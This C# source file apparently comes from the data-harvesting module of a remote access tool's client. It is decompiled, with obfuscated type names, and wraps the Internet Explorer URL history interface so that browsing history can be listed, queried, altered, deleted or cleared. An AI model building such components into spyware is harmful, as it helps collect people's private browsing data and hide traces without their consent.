using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;

namespace xClient.Core.Recovery.Browsers;

public class ExplorerUrlHistory : IDisposable
{
	public class STATURLEnumerator
	{
		private readonly GInterface2 _enumerator;

		private int _index;

		private GStruct3 _staturl;

		public GStruct3 Current => _staturl;

		public STATURLEnumerator(GInterface2 enumerator)
		{
			_enumerator = enumerator;
		}

		public bool MoveNext()
		{
			_staturl = default(GStruct3);
			_enumerator.Next(1, ref _staturl, out _index);
			if (_index == 0)
			{
				return false;
			}
			return true;
		}

		public void Skip(int celt)
		{
			_enumerator.Skip(celt);
		}

		public void Reset()
		{
			_enumerator.Reset();
		}

		public STATURLEnumerator Clone()
		{
			_enumerator.Clone(out var ppenum);
			return new STATURLEnumerator(ppenum);
		}

		public void SetFilter(string poszFilter, GEnum6 dwFlags)
		{
			_enumerator.SetFilter(poszFilter, dwFlags);
		}

		public void GetUrlHistory(IList list)
		{
			while (true)
			{
				_staturl = default(GStruct3);
				_enumerator.Next(1, ref _staturl, out _index);
				if (_index == 0)
				{
					break;
				}
				list.Add(_staturl);
			}
			_enumerator.Reset();
		}
	}

	private readonly IUrlHistoryStg2 obj;

	private GClass21 urlHistory;

	private List<GStruct3> _urlHistoryList;

	public int Count => _urlHistoryList.Count;

	public GStruct3 this[int index]
	{
		get
		{
			if (index >= _urlHistoryList.Count || index < 0)
			{
				throw new IndexOutOfRangeException();
			}
			return _urlHistoryList[index];
		}
		set
		{
			if (index >= _urlHistoryList.Count || index < 0)
			{
				throw new IndexOutOfRangeException();
			}
			_urlHistoryList[index] = value;
		}
	}

	public ExplorerUrlHistory()
	{
		urlHistory = new GClass21();
		obj = (IUrlHistoryStg2)urlHistory;
		STATURLEnumerator sTATURLEnumerator = new STATURLEnumerator((GInterface2)obj.EnumUrls);
		_urlHistoryList = new List<GStruct3>();
		sTATURLEnumerator.GetUrlHistory(_urlHistoryList);
	}

	public void Dispose()
	{
		Marshal.ReleaseComObject(obj);
		urlHistory = null;
	}

	public void AddHistoryEntry(string pocsUrl, string pocsTitle, GEnum7 dwFlags)
	{
		obj.AddUrl(pocsUrl, pocsTitle, dwFlags);
	}

	public bool DeleteHistoryEntry(string pocsUrl, int dwFlags)
	{
		try
		{
			obj.DeleteUrl(pocsUrl, dwFlags);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public GStruct3 QueryUrl(string pocsUrl, GEnum5 dwFlags)
	{
		GStruct3 lpSTATURL = default(GStruct3);
		try
		{
			obj.QueryUrl(pocsUrl, dwFlags, ref lpSTATURL);
			return lpSTATURL;
		}
		catch (FileNotFoundException)
		{
			return lpSTATURL;
		}
	}

	public void ClearHistory()
	{
		obj.ClearHistory();
	}

	public STATURLEnumerator GetEnumerator()
	{
		return new STATURLEnumerator((GInterface2)obj.EnumUrls);
	}
}
